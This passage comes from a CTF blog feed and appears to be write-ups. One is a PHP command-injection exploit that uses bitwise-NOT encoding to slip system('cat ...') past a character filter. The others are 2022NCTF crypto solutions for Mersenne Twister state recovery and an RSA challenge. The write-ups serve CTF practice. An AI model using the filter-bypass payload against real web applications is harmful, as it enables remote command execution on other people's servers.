class="language-PYTHON">&amp; ^ @ &#x3D; f 102@ ^ , &#x3D; l 108^ ^ ? &#x3D; a 97&lt; ^ [ &#x3D; g 103flag &#x3D; &#39;&amp;@^&lt;&#39;^&#39;@,?[&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-取反绕过"><a href="#2-取反绕过" class="headerlink" title="2.取反绕过"></a>2.取反绕过</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">//EXP如下<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code1</span><span class="token operator">=</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span><span class="token variable">$code2</span><span class="token operator">=</span><span class="token string double-quoted-string">"cat /flllllaaaaaaggggggg"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"?wllm=(~"</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$code1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")(~"</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$code2</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">");"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022NCTF</title>
      <link href="/2023/03/14/2022NCTF/"/>
      <url>/2023/03/14/2022NCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="2022NCTF"><a href="#2022NCTF" class="headerlink" title="2022NCTF"></a>2022NCTF</h1><p>这次Crypto题目对于我来说过于困难，还好战队的佬写了wp</p><h2 id="Coloratura"><a href="#Coloratura" class="headerlink" title="Coloratura"></a>Coloratura</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="/2023/03/14/2022NCTF/attach.png" alt="attach"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageDraw<span class="token keyword">from</span> random <span class="token keyword">import</span> getrandbitswidth <span class="token operator">=</span> <span class="token number">208</span>height <span class="token operator">=</span> <span class="token number">208</span>flag <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">makeSourceImg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    colors <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>getrandbits<span class="token punctuation">(</span>width <span class="token operator">*</span> height <span class="token operator">*</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    img <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>width<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">)</span>    x <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>            img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>colors<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> colors<span class="token punctuation">[</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> colors<span class="token punctuation">[</span>x <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            x <span class="token operator">+=</span> <span class="token number">3</span>    <span class="token keyword">return</span> img<span class="token keyword">def</span> <span class="token function">makeFlagImg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    img <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>width<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">)</span>    draw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>img<span class="token punctuation">)</span>    draw<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> flag<span class="token punctuation">,</span> fill<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> img<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    img1 <span class="token operator">=</span> makeSourceImg<span class="token punctuation">(</span><span class="token punctuation">)</span>    img2 <span class="token operator">=</span> makeFlagImg<span class="token punctuation">(</span><span class="token punctuation">)</span>    img3 <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>width<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>            p1<span class="token punctuation">,</span> p2 <span class="token operator">=</span> img1<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> img2<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>            img3<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span>p1<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">^</span> p2<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    img3<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'attach.png'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">def</span> <span class="token function">inverse_shift</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> shift<span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">,</span> mask<span class="token operator">=</span><span class="token number">0xffffffff</span><span class="token punctuation">,</span> nbit<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> x    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>nbit<span class="token operator">//</span>shift<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">type</span> <span class="token operator">==</span> <span class="token string">'l'</span><span class="token punctuation">:</span> res <span class="token operator">=</span> x <span class="token operator">^</span> res <span class="token operator">&lt;&lt;</span> shift <span class="token operator">&amp;</span> mask        <span class="token keyword">if</span> <span class="token builtin">type</span> <span class="token operator">==</span> <span class="token string">'r'</span><span class="token punctuation">:</span> res <span class="token operator">=</span> x <span class="token operator">^</span> res <span class="token operator">>></span> shift <span class="token operator">&amp;</span> mask    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">crack_extract</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> inverse_shift<span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>    x <span class="token operator">=</span> inverse_shift<span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token number">4022730752</span><span class="token punctuation">)</span>    x <span class="token operator">=</span> inverse_shift<span class="token punctuation">(</span>x<span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token number">2636928640</span><span class="token punctuation">)</span>    x <span class="token operator">=</span> inverse_shift<span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> x<span class="token keyword">def</span> <span class="token function">crack_twist</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">:</span>    high <span class="token operator">=</span> <span class="token number">0x80000000</span>    low <span class="token operator">=</span> <span class="token number">0x7fffffff</span>    mask <span class="token operator">=</span> <span class="token number">0x9908b0df</span>    state <span class="token operator">=</span> cur    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">623</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> state<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>state<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">397</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">624</span><span class="token punctuation">]</span>        <span class="token comment"># recover Y,tmp = Y</span>        <span class="token keyword">if</span> tmp <span class="token operator">&amp;</span> high <span class="token operator">==</span> high<span class="token punctuation">:</span>            tmp <span class="token operator">^</span><span class="token operator">=</span> mask            tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">1</span>            tmp <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span><span class="token number">1</span>        <span class="token comment"># recover highest bit</span>        res <span class="token operator">=</span> tmp<span class="token operator">&amp;</span>high        <span class="token comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span>        tmp <span class="token operator">=</span> state<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">^</span>state<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">396</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">624</span><span class="token punctuation">]</span>        <span class="token comment"># recover Y,tmp = Y</span>        <span class="token keyword">if</span> tmp <span class="token operator">&amp;</span> high <span class="token operator">==</span> high<span class="token punctuation">:</span>            tmp <span class="token operator">^</span><span class="token operator">=</span> mask            tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">1</span>            tmp <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span><span class="token number">1</span>        res <span class="token operator">|</span><span class="token operator">=</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">&amp;</span>low        state<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> res    <span class="token keyword">return</span> state<span class="token keyword">def</span> <span class="token function">extract</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    y <span class="token operator">=</span> x    y <span class="token operator">=</span> y <span class="token operator">^</span> y <span class="token operator">>></span> <span class="token number">11</span>    y <span class="token operator">=</span> y <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">7</span> <span class="token operator">&amp;</span> <span class="token number">2636928640</span>    y <span class="token operator">=</span> y <span class="token operator">^</span> y <span class="token operator">&lt;&lt;</span> <span class="token number">15</span> <span class="token operator">&amp;</span> <span class="token number">4022730752</span>    y <span class="token operator">=</span> y <span class="token operator">^</span> y <span class="token operator">>></span> <span class="token number">18</span>    <span class="token keyword">return</span> ywidth <span class="token operator">=</span> <span class="token number">208</span>height <span class="token operator">=</span> <span class="token number">208</span>img3 <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'attach.png'</span><span class="token punctuation">)</span>out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>        pix <span class="token operator">=</span> img3<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>        out <span class="token operator">+=</span> <span class="token punctuation">[</span>pix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pix<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pix<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>out <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> out<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>out <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>out<span class="token punctuation">)</span>now_rand <span class="token operator">=</span> <span class="token punctuation">[</span>out<span class="token punctuation">[</span>i<span class="token punctuation">:</span> i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>now_rand <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>_<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> now_rand<span class="token punctuation">]</span>state <span class="token operator">=</span> <span class="token punctuation">[</span>crack_extract<span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> now_rand<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">624</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">]</span>ini_rand <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ini_rand<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>now_rand<span class="token punctuation">)</span><span class="token punctuation">:</span>    ini_rand <span class="token operator">=</span> <span class="token punctuation">[</span>extract<span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> state<span class="token punctuation">]</span> <span class="token operator">+</span> ini_rand    state <span class="token operator">=</span> crack_twist<span class="token punctuation">(</span>state<span class="token punctuation">)</span>ini_rand <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> ini_rand<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>ini_rand <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ini_rand<span class="token punctuation">)</span>ini <span class="token operator">=</span> <span class="token punctuation">[</span>ini_rand<span class="token punctuation">[</span>i<span class="token punctuation">:</span> i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ini_rand<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>ini <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>_<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> ini<span class="token punctuation">]</span>x <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>width<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>        pix <span class="token operator">=</span> img3<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>        flag<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>pix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">^</span> ini<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> pix<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> ini<span class="token punctuation">[</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pix<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> ini<span class="token punctuation">[</span>x <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        x <span class="token operator">+=</span> <span class="token number">3</span>flag<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/03/14/2022NCTF/MyBlog\source_posts\2022NCTF.assets\image-20230314213110239.png" alt="image-20230314213110239"></p><h2 id="dp-promax"><a href="#dp-promax" class="headerlink" title="dp_promax"></a>dp_promax</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> random <span class="token keyword">import</span> <span class="token operator">*</span>nbits <span class="token operator">=</span> <span class="token number">2200</span>beta <span class="token operator">=</span> <span class="token number">0.4090</span>p<span class="token punctuation">,</span> q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1.</span> <span class="token operator">-</span> beta<span class="token punctuation">)</span> <span class="token operator">*</span> nbits<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> getPrime<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>beta <span class="token operator">*</span> nbits<span class="token punctuation">)</span><span class="token punctuation">)</span>dp <span class="token operator">=</span> getrandbits<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    d <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> getrandbits<span class="token punctuation">(</span><span class="token number">2800</span><span class="token punctuation">)</span> <span class="token operator">+</span> dp    <span class="token keyword">if</span> GCD<span class="token punctuation">(</span><span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>e <span class="token operator">=</span> inverse<span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>N <span class="token operator">=</span> p <span class="token operator">*</span> qflag <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> e<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""464606899025750482791615390931390532732509821887897591712309085550901601063278077564879008977404907960149696420600569905084710877790674620811144487196793273695410677299818852553005928726719883464753259950929627389658967363686975839007122843719077120644186512149527347589011596239118975357526295286601739159500610022611668865704395321267255495510495532836575723718629528893537204258496203582986988664571758712724716012833621718946213235799517331318543847432395934124660730725035849849213098397538770257825430994553414759593670258720138811483121575661812776764422228709640555944456671262050229568326339668953163474476292375894315141452529796879023460110135700262171343479841771785880202621863268620764622365624022769745998029192218530925601142951556044884604105411679836537695115857601380462799511756763982860794568489233188363645593920531895916578961915536512651634184316901030243872308273055047597846976235186522393272586705232233865196104059980153519729574679544611720118804955181678160902291747318283082452093621358644911467133122661514117979030740438012777487706647799981016484118139030563096894727758172549975868335144981146583216917897115148036490186786601503805423081237665632563174682597786078694318328393373685932404613578289524748699303548334929982081026234794299623231197810231207573617675284416369899798895669244928467178002707221164289324881980114394388495952610702835708089048786417144811911352052409078910656133947993308408503719003695295117416819193221069292199686731316826935595732683131084358071773123683334547655644422131844255145301597465782740484383872480344422108506521999023734887311848231938878644071391794681783746739256810803148574808119264335234153882563855891931676015967053672390419297049063566989773843180697022505093259968691066079705679011419363983756691565059184987670900243038196495478822756959846024573175127669523145115742132400975058579601219402887597108650628746511582873363307517512442800070071452415355053077719833249765357356701902679805027579294"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现N可以分解</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token keyword">import</span> libnume <span class="token operator">=</span> <span class="token number">13434798417717858802026218632686207646223656240227697459980291922185309256011429515560448846041054116798365376951158576013804627995117567639828607945684892331883636455939205318959165789619155365126516341843169010302438723082730550475978469762351865223932725867052322338651961040599801535197295746795446117201188049551816781609022917473182830824520936213586449114671331226615141179790307404380127774877066477999810164841181390305630968947277581725499758683351449811465832169178971151480364901867866015038054230812376656325631746825977860786943183283933736859324046135782895247486993035483349299820810262347942996232311978102312075736176752844163698997988956692449</span>c <span class="token operator">=</span> <span class="token number">28467178002707221164289324881980114394388495952610702835708089048786417144811911352052409078910656133947993308408503719003695295117416819193221069292199686731316826935595732683131084358071773123683334547655644422131844255145301597465782740484383872480344422108506521999023734887311848231938878644071391794681783746739256810803148574808119264335234153882563855891931676015967053672390419297049063566989773843180697022505093259968691066079705679011419363983756691565059184987670900243038196495478822756959846024573175127669523145115742132400975058579601219402887597108650628746511582873363307517512442800070071452415355053077719833249765357356701902679805027579294</span>p<span class="token operator">=</span><span class="token number">3628978044425516256252147348112819551863749940058657194357489608704171827031473111609089635738827298682760802716155197142949509565102167059366421892847010862457650295837231017990389942425249509044223464186611269388650172307612888367710149054996350799445205007925937223059</span>q<span class="token operator">=</span><span class="token number">12802692475349485610473781287027553390253771106432654573503896144916729600503566568750388778199186889792482907407718147190530044920232683163941552482789952714283570754056433670735303357508451647073211371989388879428065367142825533019883798121260838408498282273223302509241229258595176130544371781524298142815099491753819782913040582455136982147010841337850805642005577584947943848348285516563</span>phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token 